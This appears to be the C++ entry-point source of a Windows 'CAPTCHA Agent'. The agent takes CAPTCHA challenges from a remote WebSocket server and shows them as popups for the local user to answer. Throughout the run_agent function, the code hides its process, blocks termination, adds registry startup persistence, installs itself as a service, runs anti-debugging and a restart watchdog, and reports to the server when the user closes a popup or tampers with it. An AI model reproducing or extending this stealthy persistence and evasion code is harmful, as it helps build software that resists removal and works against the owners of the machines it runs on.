#include "agent/config.h"
#include "agent/types.h"
#include "core/ws_client.h"
#include "core/protocol.h"
#include "systems/service_manager.h"
#include "systems/watchdog.h"
#include "systems/anti_debug.h"
#include "systems/persistence.h"
#include "ui/captcha_popup.h"
#include "platform/win_utils.h"
#include "utils/base64.h"
#include "utils/logger.h"

#include <string>
#include <thread>
#include <atomic>
#include <filesystem>
#include <fstream>

#include <windows.h>
#include <shellapi.h>

namespace fs = std::filesystem;

static std::atomic<bool> g_running{true};
static agent::Config g_config;

static std::string get_exe_dir() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    int len = WideCharToMultiByte(CP_UTF8, 0, path, -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, path, -1, s.data(), len, nullptr, nullptr);
    return fs::path(s).parent_path().string();
}

static std::string get_exe_path() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    int len = WideCharToMultiByte(CP_UTF8, 0, path, -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, path, -1, s.data(), len, nullptr, nullptr);
    return s;
}

static bool load_config() {
    std::string exe_dir = get_exe_dir();
    std::string config_path = exe_dir + "\\agent.conf";

    if (!agent::WinUtils::read_config_file(config_path,
        g_config.server_host, g_config.server_port,
        g_config.agent_id, g_config.agent_token)) {
        agent::Logger::error("config file not found or invalid: " + config_path);
        return false;
    }

    agent::Logger::info("config loaded: server=" + g_config.server_host +
                        ":" + std::to_string(g_config.server_port) +
                        " agent_id=" + g_config.agent_id);
    return true;
}

static void on_captcha_challenge(agent::WSClient& client, const agent::CaptchaChallengeMessage& challenge) {
    // Skip if popup already showing
    if (agent::CaptchaPopup::is_active()) {
        agent::Logger::info("popup already active, sending miss for captcha id=" + challenge.id);
        agent::CaptchaResponseMessage resp;
        resp.id = challenge.id;
        resp.is_miss = true;
        resp.response_ms = 0;
        client.send_captcha_response(resp);
        return;
    }

    agent::Logger::info("captcha popup showing, timeout=" + std::to_string(challenge.timeout_sec) + "s");

    auto image_data = agent::base64_decode(challenge.image_base64);
    if (image_data.empty()) {
        agent::Logger::error("failed to decode captcha image, sending miss");
        agent::CaptchaResponseMessage resp;
        resp.id = challenge.id;
        resp.is_miss = true;
        resp.response_ms = 0;
        client.send_captcha_response(resp);
        return;
    }

    // Show popup on a separate thread (it has its own message loop)
    std::thread popup_thread([&client, challenge, image_data = std::move(image_data)]() {
        agent::CaptchaPopup popup;
        popup.show(image_data, challenge.timeout_sec, challenge.popup_message,
            [&client, id = challenge.id](const std::string& answer, bool is_miss, int64_t response_ms) {
                agent::CaptchaResponseMessage resp;
                resp.id = id;
                resp.answer = answer;
                resp.is_miss = is_miss;
                resp.response_ms = response_ms;
                client.send_captcha_response(resp);

                if (is_miss) {
                    agent::Logger::info("captcha missed id=" + id);
                } else {
                    agent::Logger::info("captcha answered id=" + id + " answer=" + answer);
                }
            });
    });
    popup_thread.detach();
}

// Run the main agent logic (used both in normal mode and service mode)
static int run_agent() {
    std::string exe_dir = get_exe_dir();

    // Load config
    if (!load_config()) {
        // Create sample config if doesn't exist
        std::string config_path = exe_dir + "\\agent.conf";
        if (!fs::exists(config_path)) {
            std::ofstream f(config_path);
            f << "# CAPTCHA Agent Configuration\n"
              << "server_host=127.0.0.1\n"
              << "server_port=8080\n"
              << "agent_id=CHANGE_ME\n"
              << "agent_token=CHANGE_ME\n";
            agent::Logger::info("created sample config at " + config_path);
        }
        return 1;
    }

    // Hide process & protect from termination
    agent::WinUtils::hide_process();
    agent::WinUtils::protect_process();

    // Persistence — registry startup + file copy
    if (g_config.enable_persistence) {
        agent::Persistence::add_to_startup(g_config);
    }

    // Try to install as Windows service (auto-recovery via SCM failure actions)
    if (!agent::ServiceManager::is_service_installed(g_config)) {
        agent::ServiceManager::install_service(g_config);
    }

    // Anti-debug
    agent::AntiDebug anti_debug;
    if (g_config.enable_anti_debug) {
        anti_debug.start();
    }

    // Watchdog — mutual process monitoring
    agent::Watchdog watchdog;
    if (g_config.enable_watchdog) {
        watchdog.start();
    }

    // WebSocket client — auto-reconnect with exponential backoff
    agent::WSClient ws_client(g_config);

    ws_client.set_on_captcha([&ws_client](const agent::CaptchaChallengeMessage& challenge) {
        on_captcha_challenge(ws_client, challenge);
    });

    ws_client.set_on_auth_result([](bool success, const std::string& message) {
        if (success) {
            agent::Logger::info("authenticated with server");
        } else {
            agent::Logger::error("auth failed: " + message);
        }
    });

    ws_client.set_on_disconnect([]() {
        agent::Logger::info("disconnected, will reconnect...");
    });

    ws_client.set_on_remote_command([](const std::string& command) {
        agent::Logger::info("received remote command: " + command);
        if (command == "uninstall") {
            agent::Logger::info("remote uninstall command received — cleaning up");
            agent::Persistence::stop_monitoring();
            agent::Persistence::remove_from_startup(g_config);
            agent::ServiceManager::uninstall_service(g_config);
            g_running.store(false);
        } else if (command == "restart") {
            agent::Logger::info("remote restart command received");
            // Watchdog will restart us
            g_running.store(false);
        }
    });

    ws_client.start();

    // Set close popup alert callback
    agent::CaptchaPopup::set_close_alert_callback([&ws_client]() {
        agent::Logger::info("user closed captcha popup — sending close_popup alert");
        ws_client.send_alert("close_popup", "User closed the CAPTCHA popup without answering");
    });

    // Start persistence monitoring (uninstall/tamper detection)
    if (g_config.enable_persistence) {
        agent::Persistence::start_monitoring(g_config,
            [&ws_client](const std::string& alert_type, const std::string& message) {
                agent::Logger::info("persistence alert: " + alert_type + " — " + message);
                ws_client.send_alert(alert_type, message);
            });
    }

    agent::Logger::info("agent started, agent_id=" + g_config.agent_id);

    // Main loop — keep running forever
    while (g_running.load()) {
        Sleep(1000);

        // Periodically verify integrity
        static int integrity_counter = 0;
        if (++integrity_counter >= 300) { // every 5 minutes
            integrity_counter = 0;
            agent::Persistence::verify_integrity();
        }
    }

    // Cleanup
    agent::Persistence::stop_monitoring();
    ws_client.stop();
    anti_debug.stop();
    watchdog.stop();

    agent::Logger::info("agent stopped");
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    std::string cmd_line(lpCmdLine);
    std::string exe_dir = get_exe_dir();

    // Initialize logger
    agent::Logger::init(exe_dir + "\\agent.log");

    // Install crash handler — auto restart on unhandled exception
    agent::WinUtils::install_crash_handler();

    // Check for service install/uninstall commands
    if (cmd_line.find("--install") != std::string::npos) {
        if (!load_config()) return 1;
        bool ok = agent::ServiceManager::install_service(g_config);
        return ok ? 0 : 1;
    }

    if (cmd_line.find("--uninstall") != std::string::npos) {
        if (!load_config()) return 1;
        agent::ServiceManager::uninstall_service(g_config);
        agent::Persistence::remove_from_startup(g_config);
        return 0;
    }

    // Check for watchdog mode
    if (cmd_line.find("--watchdog") != std::string::npos) {
        auto pos = cmd_line.find("--watchdog");
        std::string pid_str = cmd_line.substr(pos + 11);
        while (!pid_str.empty() && (pid_str[0] == ' ' || pid_str[0] == '\t')) pid_str.erase(0, 1);
        char* end = nullptr;
        unsigned long target_pid = strtoul(pid_str.c_str(), &end, 10);
        if (end == pid_str.c_str() || target_pid == 0) {
            agent::Logger::error("invalid watchdog PID: " + pid_str);
            return 1;
        }
        agent::Watchdog::run_as_watchdog(static_cast<DWORD>(target_pid), get_exe_path());
        return 0;
    }

    // Check for service mode — started by SCM
    if (cmd_line.find("--service") != std::string::npos) {
        if (!load_config()) return 1;
        // K3 fix: wire up SCM stop → g_running
        agent::ServiceManager::set_stop_callback([]() {
            g_running.store(false);
        });
        // K4 fix: SCM dispatcher must run on a separate thread since it blocks;
        // the main thread runs the agent logic
        std::thread svc_thread([]() {
            agent::ServiceManager::run_as_service(g_config);
        });
        svc_thread.detach();
        // Give SCM time to register
        Sleep(500);
    }

    // Single instance check
    HANDLE mutex = agent::WinUtils::create_single_instance_mutex("Global\\CaptchaAgentMutex");
    if (!mutex) {
        agent::Logger::info("another instance is already running, exiting");
        return 0;
    }

    int result = run_agent();

    CloseHandle(mutex);
    return result;
}
